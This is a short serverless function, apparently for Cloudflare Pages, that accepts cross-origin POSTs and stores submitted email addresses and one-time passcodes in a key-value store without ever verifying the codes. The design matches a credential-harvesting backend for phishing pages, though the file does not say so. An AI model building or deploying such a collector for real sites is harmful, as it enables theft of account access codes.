// functions/store/index.js
export async function onRequest(context) {
  const { request, env } = context;

  // Handle CORS preflight (OPTIONS) if needed
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  }

  // Only accept POST
  if (request.method !== 'POST') {
    return new Response('Method not allowed', { status: 405 });
  }

  try {
    const payload = await request.json();
    const { event, email, otp } = payload;

    // Generate a unique key using timestamp and random string
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(2, 10);
    const key = `${timestamp}-${random}`;

    let value;
    if (event === 'email_submit') {
      value = JSON.stringify({ event, email, timestamp });
    } else if (event === 'otp_complete') {
      value = JSON.stringify({ event, email, otp, timestamp });
    } else {
      return new Response(JSON.stringify({ ok: false, error: 'Unknown event' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    // Store in KV
    await env.STORE.put(key, value);

    return new Response(JSON.stringify({ ok: true }), {
      headers: { 'Content-Type': 'application/json' },
    });
  } catch (err) {
    console.error('Error in store function:', err);
    return new Response(JSON.stringify({ ok: false, error: 'Internal error' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}